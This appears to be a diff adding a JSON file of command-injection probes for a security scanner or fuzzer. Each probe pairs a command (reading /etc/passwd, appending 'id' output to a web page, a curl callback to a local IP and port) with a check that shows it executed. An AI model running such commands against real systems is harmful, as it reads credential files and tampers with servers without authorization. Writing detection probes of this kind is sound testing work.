@@ -1,0 +1,17 @@
+[
+    {
+        "base" : ["cat", "/etc/passwd"],
+        "type" : "MatchStringOutput",
+        "MatchStringOutput" : ["root:x:0:0:root:", "daemon:x:1:1:daemon:"]
+    },
+    {
+        "base" : ["id", ">>", "/var/www/html/index.html"],
+        "type" : "MatchStringPage", 
+        "MatchStringPage" : ["http://192.168.123.100/index.html", "uid=", "gid=", "groups="]
+    },
+    {
+        "base" : ["curl", "192.168.123.100:5337"],
+        "type" : "ListenOnPort",
+        "ListenOnPort" : [5337, 10.0]
+    }    
+]
